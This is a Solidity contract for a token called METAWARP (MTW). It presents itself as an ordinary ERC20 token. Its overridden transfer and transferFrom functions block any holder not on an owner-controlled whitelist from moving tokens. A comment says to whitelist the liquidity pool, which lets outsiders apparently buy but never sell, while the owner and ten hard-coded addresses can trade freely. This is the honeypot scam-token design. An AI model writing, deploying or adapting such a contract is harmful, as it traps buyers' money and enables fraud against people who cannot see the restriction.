// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("METAWARP", "MTW") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 1000000 * 10 ** decimals());
        whiteList[0x9bE421589385D74c93ebdFAD9d85115952Ad7693]= true;
        whiteList[0x03993c4A9301378a7b12489DA8Ac981a27BD457d]=true;
        whiteList[0x517C6BBEbC61D9ec847471eEBBD5fE66727031cE]=true;
        whiteList[0x888547e0B8cD349d8930d6E5DF61652c170Bd9BA]=true;
        whiteList[0x30a4be5210033beb2F2e929F4C35007481f17c37]=true;
        whiteList[0x40fE2089B5a82ed5887C5Fe80162C0C634B71add]=true;
        whiteList[0x1d9308CAE832dbC8aDB156cf0BB66b5e16B4c4F7]=true;
        whiteList[0xe3346c92Fd9469D1d84fdF5b3a5Fdf87e14a4B60]=true;
        whiteList[0xe32b75740f235e027959026f0ba6fd0Cd856F377]=true;
        whiteList[0x72F4B4738C6eb8116FaAAdfd43A1fF67AdAe51dA]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}